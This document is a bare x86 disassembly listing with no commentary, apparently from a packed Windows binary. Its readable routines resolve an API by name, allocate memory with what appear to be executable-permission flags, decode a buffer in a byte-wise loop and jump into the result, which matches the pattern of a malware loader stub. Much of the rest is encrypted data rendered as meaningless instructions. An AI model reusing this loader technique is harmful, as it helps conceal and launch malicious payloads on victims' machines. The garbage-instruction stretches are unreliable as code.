  421471:	in     al,0xc8
  421473:	sbb    eax,0xe3ef0bea
  421478:	ror    dl,1
  42147a:	aaa    
  42147b:	inc    eax
  42147c:	mov    esi,0xcf9f9add
  421481:	sbb    DWORD PTR [esp+edx*2],edx
  421484:	gs mov bl,0x27
  421487:	jb     0x421470
  421489:	in     al,dx
  42148a:	mov    dl,0x33
  42148c:	in     eax,dx
  42148d:	repz retf 0x5e71
  421491:	and    BYTE PTR [ebx+ebx*2],bl
  421494:	mov    DWORD PTR [eax],ebx
  421496:	ror    DWORD PTR [edi-0x4ba519d4],cl
  42149c:	dec    esp
  42149d:	fptan  
  42149f:	mov    esp,0x4bd5c0f4
  4214a4:	adc    DWORD PTR [edi],ebp
  4214a6:	fcmovb st,st(4)
  4214a8:	jbe    0x42142c
  4214aa:	adc    al,0xa8
  4214ac:	loopne 0x42144f
  4214ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214af:	es cs (bad) 
  4214b3:	mov    bh,0xbf
  4214b5:	ss add eax,0xb29fe166
  4214bb:	add    dh,BYTE PTR [edx-0x6a]
  4214be:	push   ss
  4214bf:	stc    
  4214c0:	or     al,ah
  4214c2:	and    cl,BYTE PTR [eax]
  4214c4:	in     al,dx
  4214c5:	xchg   edx,eax
  4214c6:	mov    DWORD PTR [ebx-0x7f],ebp
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x1623a299
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xd43deaf3
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	inc    DWORD PTR [ecx-0x234fc6ca]
  421833:	in     eax,dx
  421834:	mov    ds:0xa3c0b204,eax
  421839:	cli    
  42183a:	push   esp
  42183b:	xor    ebp,DWORD PTR [ecx+ebp*4+0x8]
  42183f:	fucomip st,st(5)
  421841:	mov    ds:0xa3c0b604,eax
  421846:	mov    edx,0xa96cccab
  42184b:	mov    al,0xdf
  42184d:	in     eax,dx
  42184e:	mov    ds:0xa3c0b604,eax
  421853:	cli    
  421854:	stos   DWORD PTR es:[edi],eax
  421855:	int3   
  421856:	ins    BYTE PTR es:[edi],dx
  421857:	test   eax,0xa3eddfb0
  42185c:	add    al,0xb6
  42185e:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421865:	mov    al,0xdf
  421867:	in     eax,dx
  421868:	mov    ds:0xa3c04e04,eax
  42186d:	cli    
  42186e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186f:	rcl    esi,cl
  421871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421872:	mov    al,0x6b
  421874:	in     al,0x6e
  421876:	and    eax,0x37efc10e
  42187b:	mov    bl,BYTE PTR [eax-0x3c3ffc]
  421881:	popf   
  421882:	shr    DWORD PTR [ebx-0x2f],1
  421885:	mov    dl,0xc2
  421887:	xchg   edi,eax
  421888:	mov    ebp,DWORD PTR [edi-0x4f2138f3]
  42188e:	cdq    
  42188f:	and    DWORD PTR [esi-0x2d],0xffffffe0
  421893:	ror    DWORD PTR [edi-0x38fa133b],1
  421899:	nop
  42189a:	fwait
  42189b:	mov    ds:0xafdb24f0,al
  4218a0:	(bad)  
  4218a1:	lahf   
  4218a2:	test   ecx,eax
  4218a4:	popa   
  4218a5:	mov    ds:0xa3eddf94,eax
  4218aa:	add    al,0xb6
  4218ac:	shl    BYTE PTR [ebx+0x353032fd],0xea
  4218b3:	dec    eax
  4218b4:	dec    ebp
  4218b5:	out    0xe0,eax
  4218b7:	cld    
  4218b8:	and    al,0xca
  4218ba:	loopne 0x4218be
  4218bc:	cmp    esi,eax
  4218be:	xor    al,0xcc
  4218c0:	mov    esp,0x965bb2d5
  4218c5:	mov    esp,0xa1c2c698
  4218ca:	push   cs
  4218cb:	xchg   esp,eax
  4218cc:	cmp    edi,DWORD PTR [edx+0xe9a8887]
  4218d2:	fidivr WORD PTR [eax]
  4218d4:	xor    eax,esi
  4218d6:	xchg   DWORD PTR [edx+0x55],eax
  4218d9:	mov    ds:0xa97f27f6,eax
  4218de:	dec    esi
  4218df:	shr    DWORD PTR ss:[ecx+0x665e53b0],1
  4218e6:	jecxz  0x421918
  4218e8:	fsubrp st(7),st
  4218ea:	sti    
  4218eb:	cld    
  4218ec:	and    al,0xca
  4218ee:	loopne 0x4218f2
  4218f0:	cmp    dh,al
  4218f2:	inc    esp
  4218f3:	push   eax
  4218f4:	and    dl,ch
  4218f6:	push   edx
  4218f7:	jnp    0x42187d
  4218f9:	mov    esp,0xa1685b8d
  4218fe:	xchg   esp,eax
  4218ff:	or     DWORD PTR [edx+edi*4+0xe3115d7],edx
  421906:	out    dx,al
  421907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421908:	stos   DWORD PTR es:[edi],eax
  421909:	lock jmp 0xe8e61743
  42190f:	mov    edx,0x4e46a9e2
  421914:	push   edx
  421915:	test   eax,0x4afc2a8
  42191a:	jmp    0xb604:0xa3e74d48
  421921:	shl    BYTE PTR [ebx+0x3cccabfa],0xec
  421928:	mov    al,0xdf
  42192a:	mov    eax,ds:0x60b606a2
  42192f:	jae    0x4218c2
  421931:	in     al,0xcc
  421933:	ins    BYTE PTR es:[edi],dx
  421934:	test   eax,0xa3eddfb0
  421939:	add    al,0x56
  42193b:	shl    BYTE PTR [eax+0x66cda0fb],0xa9
  421942:	mov    al,0x31
  421944:	jmp    0xc64c1dec
  421949:	mov    ds:0x6cccabfa,eax
  42194e:	mov    eax,0xa3eddf0d
  421953:	adc    al,0xb6
  421955:	shl    BYTE PTR [ebx+0x6cccaefa],0xa9
  42195c:	icebp  
  42195d:	fucomip st,st(5)
  42195f:	mov    bl,0x4
  421961:	mov    dh,0xc0
  421963:	mov    eax,ds:0x6cc9abfa
  421968:	test   al,0xb0
  42196a:	fucomip st,st(5)
  42196c:	mov    ds:0xa2c0b304,eax
  421971:	cli    
  421972:	stos   DWORD PTR es:[edi],eax
  421973:	int3   
  421974:	ins    BYTE PTR es:[edi],dx
  421975:	test   eax,0xa3e18fb0
  42197a:	add    al,0xb2
  42197c:	shl    BYTE PTR [ebx+0x6cc94ffb],0xab
  421983:	mov    al,0xdf
  421985:	ins    DWORD PTR es:[edi],dx
  421986:	mov    ds:0xa3c0a604,eax
  42198b:	jmp    0xdfa0:0xa96cccab
  421992:	in     eax,dx
  421993:	mov    bl,0x4
  421995:	mov    dh,0xc0
  421997:	mov    ds:0x6cdcabfa,eax
  42199c:	test   eax,0xa3eddfb0
  4219a1:	add    al,0xb6
  4219a3:	shl    BYTE PTR [ebx+0x60f55ffa],0xa9
  4219aa:	(bad)  
  4219ac:	in     eax,dx
  4219ad:	mov    ds:0xa3cb4604,eax
  4219b2:	mov    ch,0xe2
  4219b4:	int3   
  4219b5:	ins    BYTE PTR es:[edi],dx
  4219b6:	test   eax,0xa3eddfb0
  4219bb:	add    al,0xb6
  4219bd:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  4219c4:	mov    al,0xdf
  4219c6:	in     eax,dx
  4219c7:	mov    ds:0xa3c0b604,eax
  4219cc:	cli    
  4219cd:	stos   DWORD PTR es:[edi],eax
  4219ce:	int3   
  4219cf:	ins    BYTE PTR es:[edi],dx
  4219d0:	test   eax,0xa3eddfb0
  4219d5:	add    al,0xb6
  4219d7:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  4219de:	mov    al,0xdf
  4219e0:	in     eax,dx
  4219e1:	mov    ds:0xa3c0b604,eax
  4219e6:	cli    
  4219e7:	stos   DWORD PTR es:[edi],eax
  4219e8:	int3   
  4219e9:	ins    BYTE PTR es:[edi],dx
  4219ea:	test   eax,0xa3eddfb0
  4219ef:	add    al,0xb6
  4219f1:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  4219f8:	mov    al,0xdf
  4219fa:	in     eax,dx
  4219fb:	mov    ds:0xa3c0b604,eax
  421a00:	cli    
  421a01:	stos   DWORD PTR es:[edi],eax
  421a02:	int3   
  421a03:	ins    BYTE PTR es:[edi],dx
  421a04:	test   eax,0xa3eddfb0
  421a09:	add    al,0xb6
  421a0b:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421a12:	mov    al,0xdf
  421a14:	in     eax,dx
  421a15:	mov    ds:0xa3c0b604,eax
  421a1a:	cli    
  421a1b:	stos   DWORD PTR es:[edi],eax
  421a1c:	int3   
  421a1d:	ins    BYTE PTR es:[edi],dx
  421a1e:	xchg   esp,eax
  421a20:	mov    edx,0xb604d795
  421a25:	shl    BYTE PTR [ebx+0x6ccca01a],0xb9
  421a2c:	mov    al,0xdf
  421a2e:	in     eax,dx
  421a2f:	ja     0x421a31
  421a31:	mov    dh,0xc0
  421a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a34:	cli    
  421a35:	stos   DWORD PTR es:[edi],eax
  421a36:	pushf  
  421a37:	sub    edx,ebp
  421a39:	or     BYTE PTR [ebx-0x49fb5c5e],0xc0
  421a40:	mov    ds:0x6ccc8bfa,eax
  421a45:	dec    ecx
  421a46:	sahf   
  421a47:	lods   eax,DWORD PTR ds:[esi]
  421a48:	sahf   
  421a49:	shl    DWORD PTR [edi-0x4a],1
  421a4c:	shl    BYTE PTR [ebx+0x6ccccbfa],0xa9
  421a53:	inc    eax
  421a54:	aam    0xed
  421a56:	mov    ds:0xa3c0b65e,eax
  421a5b:	and    ch,BYTE PTR [edi-0x4f569334]
  421a61:	fucomip st,st(5)
  421a63:	mov    ds:0xa3c0b604,eax
  421a68:	cli    
  421a69:	stos   DWORD PTR es:[edi],eax
  421a6a:	in     al,dx
  421a6b:	ins    BYTE PTR es:[edi],dx
  421a6c:	test   eax,0xa3eddf50
  421a71:	add    al,0xb6
  421a73:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421a7a:	mov    al,0xdf
  421a7c:	in     eax,dx
  421a7d:	mov    ds:0xa3c0b604,eax
  421a82:	cli    
  421a83:	stos   DWORD PTR es:[edi],eax
  421a84:	int3   
  421a85:	ins    BYTE PTR es:[edi],dx
  421a86:	test   eax,0xa3eddfb0
  421a8b:	add    al,0xb6
  421a8d:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421a94:	mov    al,0xdf
  421a96:	in     eax,dx
  421a97:	mov    ds:0xa3c0b604,eax
  421a9c:	cli    
  421a9d:	stos   DWORD PTR es:[edi],eax
  421a9e:	int3   
  421a9f:	ins    BYTE PTR es:[edi],dx
  421aa0:	test   eax,0xa3eddfb0
  421aa5:	add    al,0xb6
  421aa7:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421aae:	mov    al,0xdf
  421ab0:	in     eax,dx
  421ab1:	mov    ds:0xa3c0b604,eax
  421ab6:	cli    
  421ab7:	stos   DWORD PTR es:[edi],eax
  421ab8:	int3   
  421ab9:	ins    BYTE PTR es:[edi],dx
  421aba:	test   eax,0xa3eddfb0
  421abf:	add    al,0xb6
  421ac1:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421ac8:	mov    al,0xdf
  421aca:	in     eax,dx
  421acb:	mov    ds:0xa3c0b604,eax
  421ad0:	cli    
  421ad1:	stos   DWORD PTR es:[edi],eax
  421ad2:	int3   
  421ad3:	ins    BYTE PTR es:[edi],dx
  421ad4:	test   eax,0xa3eddfb0
  421ad9:	add    al,0xb6
  421adb:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421ae2:	mov    al,0xdf
  421ae4:	in     eax,dx
  421ae5:	mov    ds:0xa3c0b604,eax
  421aea:	cli    
  421aeb:	stos   DWORD PTR es:[edi],eax
  421aec:	int3   
  421aed:	ins    BYTE PTR es:[edi],dx
  421aee:	test   eax,0xa3eddfb0
  421af3:	add    al,0xb6
  421af5:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421afc:	mov    al,0xdf
  421afe:	in     eax,dx
  421aff:	mov    ds:0xa3c0b604,eax
  421b04:	cli    
  421b05:	stos   DWORD PTR es:[edi],eax
  421b06:	int3   
  421b07:	ins    BYTE PTR es:[edi],dx
  421b08:	test   eax,0xa3eddfb0
  421b0d:	add    al,0xb6
  421b0f:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b16:	mov    al,0xdf
  421b18:	in     eax,dx
  421b19:	mov    ds:0xa3c0b604,eax
  421b1e:	cli    
  421b1f:	stos   DWORD PTR es:[edi],eax
  421b20:	int3   
  421b21:	ins    BYTE PTR es:[edi],dx
  421b22:	test   eax,0xa3eddfb0
  421b27:	add    al,0xb6
  421b29:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b30:	mov    al,0xdf
  421b32:	in     eax,dx
  421b33:	mov    ds:0xa3c0b604,eax
  421b38:	cli    
  421b39:	stos   DWORD PTR es:[edi],eax
  421b3a:	int3   
  421b3b:	ins    BYTE PTR es:[edi],dx
  421b3c:	test   eax,0xa3eddfb0
  421b41:	add    al,0xb6
  421b43:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b4a:	mov    al,0xdf
  421b4c:	in     eax,dx
  421b4d:	mov    ds:0xa3c0b604,eax
  421b52:	cli    
  421b53:	stos   DWORD PTR es:[edi],eax
  421b54:	int3   
  421b55:	ins    BYTE PTR es:[edi],dx
  421b56:	test   eax,0xa3eddfb0
  421b5b:	add    al,0xb6
  421b5d:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b64:	mov    al,0xdf
  421b66:	in     eax,dx
  421b67:	mov    ds:0xa3c0b604,eax
  421b6c:	cli    
  421b6d:	stos   DWORD PTR es:[edi],eax
  421b6e:	int3   
  421b6f:	ins    BYTE PTR es:[edi],dx
  421b70:	test   eax,0xa3eddfb0
  421b75:	add    al,0xb6
  421b77:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b7e:	mov    al,0xdf
  421b80:	in     eax,dx
  421b81:	mov    ds:0xa3c0b604,eax
  421b86:	cli    
  421b87:	stos   DWORD PTR es:[edi],eax
  421b88:	int3   
  421b89:	ins    BYTE PTR es:[edi],dx
  421b8a:	test   eax,0xa3eddfb0
  421b8f:	add    al,0xb6
  421b91:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421b98:	mov    al,0xdf
  421b9a:	in     eax,dx
  421b9b:	mov    ds:0xa3c0b604,eax
  421ba0:	cli    
  421ba1:	stos   DWORD PTR es:[edi],eax
  421ba2:	int3   
  421ba3:	ins    BYTE PTR es:[edi],dx
  421ba4:	test   eax,0xa3eddfb0
  421ba9:	add    al,0xb6
  421bab:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421bb2:	mov    al,0xdf
  421bb4:	in     eax,dx
  421bb5:	mov    ds:0xa3c0b604,eax
  421bba:	cli    
  421bbb:	stos   DWORD PTR es:[edi],eax
  421bbc:	int3   
  421bbd:	ins    BYTE PTR es:[edi],dx
  421bbe:	test   eax,0xa3eddfb0
  421bc3:	add    al,0xb6
  421bc5:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421bcc:	mov    al,0xdf
  421bce:	in     eax,dx
  421bcf:	mov    ds:0xa3c0b604,eax
  421bd4:	cli    
  421bd5:	stos   DWORD PTR es:[edi],eax
  421bd6:	int3   
  421bd7:	ins    BYTE PTR es:[edi],dx
  421bd8:	test   eax,0xa3eddfb0
  421bdd:	add    al,0xb6
  421bdf:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421be6:	mov    al,0xdf
  421be8:	in     eax,dx
  421be9:	mov    ds:0xa3c0b604,eax
  421bee:	cli    
  421bef:	stos   DWORD PTR es:[edi],eax
  421bf0:	int3   
  421bf1:	ins    BYTE PTR es:[edi],dx
  421bf2:	test   eax,0xa3eddfb0
  421bf7:	add    al,0xb6
  421bf9:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421c00:	mov    al,0xdf
  421c02:	in     eax,dx
  421c03:	mov    ds:0xa3c0b604,eax
  421c08:	cli    
  421c09:	stos   DWORD PTR es:[edi],eax
  421c0a:	int3   
  421c0b:	ins    BYTE PTR es:[edi],dx
  421c0c:	test   eax,0xa3eddfb0
  421c11:	add    al,0xb6
  421c13:	shl    BYTE PTR [ebx+0x6cccabfa],0xa9
  421c1a:	mov    al,0xdf
  421c1c:	in     eax,dx
  421c1d:	mov    ds:0xa3c0b604,eax
  421c22:	cli    
  421c23:	stos   DWORD PTR es:[edi],eax
  421c24:	int3   
  421c25:	ins    BYTE PTR es:[edi],dx
  421c26:	test   eax,0xa3eddfb0
  421c2b:	add    al,0xb6
  421c2d:	ror    ah,0x52
  421c30:	mov    al,ds:0xb0a943cc
  421c35:	iret   
  421c36:	in     eax,dx
  421c37:	mov    ds:0xd21a142e,eax
  421c3c:	pushf  
  421c3d:	push   esp
  421c3e:	loope  0x421c32
  421c40:	cs loopne 0x421c75
  421c43:	fisttp DWORD PTR [ebx+0x17]
  421c46:	add    dl,BYTE PTR [ebp-0x3b]
  421c49:	mov    ebp,DWORD PTR [edi]
  421c4b:	xchg   esi,eax
  421c4c:	jg     0x421c66
  421c4e:	pop    es
  421c4f:	leave  
  421c50:	add    BYTE PTR [edi-0x72],0x37
  421c54:	push   es
  421c55:	lea    ebx,[eax-0x65aa0cc5]
  421c5b:	jmp    FWORD PTR [esi-0x6]
  421c5e:	add    DWORD PTR [ecx+edx*4],0xfaaf2b67
  421c65:	mov    eax,ds:0x28d9bc5
  421c6a:	stc    
  421c6b:	adc    ah,BYTE PTR [ecx+edi*4+0x1e]
  421c6f:	xchg   DWORD PTR [ecx-0x19],eax
  421c72:	pop    ds
  421c73:	test   eax,0xe7414886
  421c78:	dec    esp
  421c79:	pusha  
  421c7a:	xchg   esi,eax
  421c7b:	arpl   WORD PTR [ebx+ecx*1-0x2ed61eff],bp
  421c82:	test   BYTE PTR [esi-0xf4a9252],0xe9
  421c89:	fisub  WORD PTR [edi+0x2a]
  421c8c:	xchg   esi,eax
  421c8d:	mov    gs,WORD PTR [esi-0x3721a2fc]
  421c93:	loopne 0x421c2c
  421c95:	xor    dl,al
  421c97:	jno    0x421c64
  421c99:	push   0x78
  421c9b:	test   DWORD PTR [edi+0x74],edx
  421c9e:	(bad)
  421ca1:	mov    DWORD PTR [eax-0x48],esp
  421ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ca5:	sbb    DWORD PTR [esi+0x2a],esi
  421ca8:	adc    eax,0x8daff6cb
  421cad:	sti    
  421cae:	xchg   ecx,esi
  421cb0:	outs   dx,DWORD PTR ds:[esi]
  421cb1:	dec    ebp
  421cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb3:	mov    ds:0xf20df7ce,al
  421cb8:	out    0xe6,eax
  421cba:	shl    BYTE PTR [ebx],0x89
  421cbd:	sub    al,0xc9
  421cbf:	iret   
  421cc0:	fistp  WORD PTR [eax]
  421cc2:	cs cwde 
  421cc4:	popf   
  421cc5:	mov    cl,0x25
  421cc7:	mov    ecx,0x76a9329b
  421ccc:	cli    
  421ccd:	aam    0xdf
  421ccf:	scas   eax,DWORD PTR es:[edi]
  421cd0:	pop    ds
